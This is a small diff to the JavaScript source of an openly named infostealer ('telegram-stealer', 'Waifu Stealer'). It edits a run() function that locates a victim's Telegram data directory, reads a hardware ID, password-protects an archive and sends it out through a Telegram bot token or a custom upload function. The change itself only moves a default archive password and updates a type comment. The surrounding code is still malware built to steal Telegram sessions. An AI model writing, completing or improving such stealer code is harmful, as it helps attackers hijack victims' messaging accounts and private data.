@@ -160,16 +160,18 @@ function deleteArchive(archivePath) {
  * @type {object}
  * @property {string?} telegramChatId
  * @property {string?} telegramToken
- * @property {((filePath: string, filename: string, caption: string) => any)?} uploadFileFn
+ * @property {((filePath: string, filename: string, caption: string) => Promise<void>)?} uploadFileFn Waifu Stealer upload file function
  * @property {string?} archivePassword
  */
 
 /** @param {RunArg} arg0 */
-async function run({ telegramChatId, telegramToken, uploadFileFn, archivePassword = 'rigwild/telegram-stealer' }) {
+async function run({ telegramChatId, telegramToken, uploadFileFn, archivePassword }) {
   if (uploadFileFn && (telegramChatId || telegramToken))
     throw new Error('Do not provide both a custom upload function and Telegram chat ID and Telegram token!')
   if (!uploadFileFn && (!telegramChatId || !telegramToken))
     throw new Error('Telegram chat ID and Telegram token are required if not providing a custom upload function!')
+
+  if (!archivePassword) archivePassword = 'rigwild/telegram-stealer'
 
   const telegramDirectoryPath = await findTelegramDirectoryPath()
   const hwid = await getHwid()
